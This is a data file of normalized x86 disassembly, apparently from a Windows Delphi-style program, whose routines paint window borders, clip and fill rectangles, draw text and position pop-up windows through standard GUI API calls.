jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_44dae5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d70c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4477a8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44db24
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44862c
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4460cc
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_44db6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44884c
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44db9c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_4498ec
xor ecx ecx
push ebp
push sub_44dccb
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_449d84
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dcd2
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4498f4
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_449d48
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44dcd2
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40346c
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40346c
jmp r-xdata
sub_44dd68
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44790c
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44790c
sub_44ddac
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44790c
sub_44de1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_44deac
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44e112
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424118
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43af70
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43b7c8
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_44e154
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406bf8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4462a8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44a940
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44790c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_448ad0
sub_44e1c0
push ebx
push esi
mov esi edx
call sub_45e10c
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406b88
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44790c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406b88
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44790c
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_44e224
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44ad08
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44e25c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44e254
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44e29c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_445864
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_445340
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_44e2f8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44593c
test bl bl
jle r-xdata
xor eax eax
call sub_443934
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_44e338
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_42482c
xor eax eax
push ebp
push sub_44e3d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424ba0
xor eax eax
push ebp
push sub_44e3b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e3b7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_424ba0
retn
sub_44e3e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44ecd8
mov edx 0x80ffff
mov eax esi
call sub_446904
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_424a40
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424200
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_44e450
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_449ee0
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bee0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_449e78
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_44e4bc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e512
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e519
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ReleaseDC
retn
sub_44e520
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44e5b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_423918
mov eax ebx
call sub_448a78
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x14 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x208 ]
call sub_424b20
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e5c0
lea eax [ ebp - 0x14 ]
call sub_403fe8
retn
sub_44e5c8
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_44e634
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_44e6bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e6c6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_446764
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_424980
mov edx eax
add edx 0x6
mov eax esi
call sub_445f20
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_446764
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_42499c
mov edx eax
add edx 0x4
mov eax esi
call sub_445f44
sub_44e6cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_44e8a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446794
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4479b0
mov eax [ esi ]
call sub_464a3c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_464a48
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_464a3c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_464a30
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_464a48
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_464a24
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_464a30
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_464a24
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44a788
push 0x4
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e8ac
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4042a8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
